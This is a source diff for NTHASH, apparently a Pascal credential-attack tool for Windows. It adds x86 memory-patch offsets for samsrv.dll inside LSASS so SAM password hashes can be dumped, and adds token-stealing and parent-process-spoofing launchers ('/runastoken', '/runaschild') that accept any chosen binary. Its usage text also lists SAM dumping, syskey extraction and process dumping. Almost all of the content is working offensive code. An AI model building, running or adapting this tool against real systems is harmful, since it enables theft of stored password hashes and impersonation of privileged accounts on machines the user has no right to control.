@@ -19,7 +19,7 @@ WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);
 var
   lsass_pid:dword=0;
   p:dword;
-  pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
+  binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
   mystringsid:pchar;
@@ -331,6 +331,7 @@ result:=false;
 //
 if server<>''  then
    begin
+   writeln('server:'+server);
    CreateFromStr (ustr_server,server);
    Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
    end
@@ -349,7 +350,7 @@ if (Status <> 0) and (status<>$00000105) then
    else log ('SamEnumerateDomainsInSamServer ok');
 if (status=0) or (status=$00000105) then
    begin
-   log('count='+inttostr(count),1);
+   log('count='+inttostr(count),0);
    ptr:=buffer;
    for i:=1 to count do
        begin
@@ -405,6 +406,7 @@ result:=false;
 //
 if server<>''  then
    begin
+   writeln('server:'+server);
    CreateFromStr (ustr_server,server);
    Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
    end
@@ -462,7 +464,7 @@ if (Status <> 0) and (status<>$00000105) then
    if (status=0) or (status=$00000105) then
       begin
       result:=true;
-      log('count='+inttostr(count),1);
+      log('count='+inttostr(count),0);
 
       ptr:=buffer;
       for i:=1 to count do
@@ -750,6 +752,7 @@ WIN_BUILD_10_1803:ShortInt=	-21; //verified
 WIN_BUILD_10_1809:ShortInt=	-24;
 //offset x86
 WIN_BUILD_XP_86:ShortInt=-8;
+WIN_BUILD_7_86:ShortInt=-8; //verified
 WIN_BUILD_8_86:ShortInt=-12;
 WIN_BUILD_BLUE_86:ShortInt=-8;
 WIN_BUILD_10_1507_86:ShortInt=-8;
@@ -771,12 +774,13 @@ var
   patch_pos:ShortInt=0;
   pattern:tbytes;
 begin
+  result:=false;
   if pid=0 then exit;
   //if user='' then exit;
   //
   if (lowercase(osarch)='amd64') then
      begin
-     if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA; //win vista
+     if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA;
      if copy(winver,1,3)='6.3' then patch_pos :=WIN_BUILD_BLUE; //win 8.1
      if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507;
      if (pos('-1703',winver)>0) then patch_pos :=WIN_BUILD_10_1703;
@@ -784,7 +788,15 @@ begin
      if (pos('-1803',winver)>0) then patch_pos :=WIN_BUILD_10_1803;
      if (pos('-1809',winver)>0) then patch_pos :=WIN_BUILD_10_1809;
      end;
-  //x86 to do...
+  if (lowercase(osarch)='x86') then
+     begin
+     if copy(winver,1,3)='5.1' then patch_pos :=WIN_BUILD_XP_86;
+     //vista - 6.0?
+     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_7_86;
+     //win 8.0 ?
+     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507_86;
+     if (pos('-1607',winver)>0) then patch_pos :=WIN_BUILD_10_1607_86;
+     end;
   if patch_pos =0 then
      begin
      log('no patch mod for this windows version',1);
@@ -808,7 +820,8 @@ begin
                    begin
                     if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                       begin
-                      dummy:=strpas(szModName );
+                      dummy:=lowercase(strpas(szModName ));
+                      //writeln(dummy); //debug
                       if pos('samsrv.dll',dummy)>0 then
                          begin
                          log('samsrv.dll found:'+inttohex(hMods[count],8),0);
@@ -836,7 +849,7 @@ begin
                                         log('***************************************',0);
                                         if QueryUsers ('','',@callback_users )=true
                                         //if QueryInfoUser (user)=true
-                                           then log('SamQueryInformationUser OK',0)
+                                           then begin log('SamQueryInformationUser OK',0);result:=true;end
                                            else log('SamQueryInformationUser NOT OK',1);
                                         log('***************************************',0);
                                         finally //we really do want to patch back
@@ -856,6 +869,7 @@ begin
                                end;
                             }
                             end;//if GetModuleInformation...
+                         break; //no need to search other modules...
                          end; //if pos('samsrv.dll',dummy)>0 then
                       end; //if GetModuleFileNameExA
                    end; //for count:=0...
@@ -1102,7 +1116,7 @@ ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
   for i:=3 downto 0 do
     begin
     result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),NORMAL_PRIORITY_CLASS,
-    nil,nil,
+    nil,pwidechar(widestring(GetCurrentDir)),
     StartupInfo,ProcessInformation,
     TIntegrityLevel(i),
     strtoint(pid ));
@@ -1136,8 +1150,10 @@ begin
   log('NTHASH /getdomains [/server:hostname]',1);
   log('NTHASH /dumpsam',1);
   log('NTHASH /getsyskey',1);
-  log('NTHASH /runasuser /user:username /password:password',1);
-  log('NTHASH /runastoken /pid:12345',1);
+  log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
+  log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
+  log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
+  log('NTHASH /enumpriv',1);
   log('NTHASH /dumpprocess /pid:12345',1);
   log('NTHASH /a_command /verbose',1);
   end;
@@ -1148,9 +1164,14 @@ begin
   //logon list located in memory
   //now need to get lsakeys to decrypt crdentials
   //dumplogons (lsass_pid,'');
-
   //exit;
   //
+  p:=pos('/enumpriv',cmdline);
+  if p>0 then
+     begin
+     if enumprivileges=false then writeln('enumprivileges NOT OK');
+     exit;
+     end;
   p:=pos('/getsyskey',cmdline);
   if p>0 then
      begin
@@ -1163,7 +1184,13 @@ begin
        pid:=copy(cmdline,p,255);
        pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
        delete(pid,pos(' ',pid),255);
-       //log(server);
+       end;
+  p:=pos('/binary:',cmdline);
+  if p>0 then
+       begin
+       binary:=copy(cmdline,p,255);
+       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(binary,pos(' ',binary),255);
        end;
   p:=pos('/dumpprocess',cmdline);
   if p>0 then
@@ -1175,7 +1202,7 @@ begin
   p:=pos('/dumpsam',cmdline);
   if p>0 then
      begin
-     dumpsam (lsass_pid ,'');
+     if dumpsam (lsass_pid ,'') then log('OK',1) else log('NOT OK',1);
      exit;
      end;
   p:=pos('/server:',cmdline);
@@ -1283,14 +1310,18 @@ begin
   p:=pos('/runastoken',cmdline);
   if p>0 then
      begin
+     if copy(winver,1,3)='5.1' then exit;
      if pid='' then exit;
-     if createprocessaspid   (sysdir+'\cmd.Exe',pid) then log('OK',1) else log('NOT OK',1);
+     if binary='' then binary:=sysdir+'\cmd.Exe';
+     if createprocessaspid   (binary,pid)
+        then log('OK',1) else log('NOT OK',1);
      exit;
      end;
   p:=pos('/runasuser',cmdline);
   if p>0 then
      begin
-     if CreateProcessAsLogon (user,password,sysdir+'\cmd.Exe','')=0
+     if binary='' then binary:=sysdir+'\cmd.Exe';
+     if CreateProcessAsLogon (user,password,binary,'')=0
         then log('Done',1)
         else log('Failed',1);
      //WriteLn(Impersonate('l4mpje','Password123')) ;
@@ -1298,6 +1329,16 @@ begin
      //WriteLn (GetCurrUserName);
      //RevertToSelf ;
      //writeln(GetCurrUserName );
+     end;
+  p:=pos('/runaschild',cmdline);
+  if p>0 then
+     begin
+     if copy(winver,1,3)='5.1' then exit;
+     if pid='' then exit;
+     if binary='' then binary:=sysdir+'\cmd.Exe';
+     if CreateProcessOnParentProcess(strtoint(pid),binary)=true
+        then log('OK',1) else log('NOT OK',1);
+     exit;
      end;
 
 
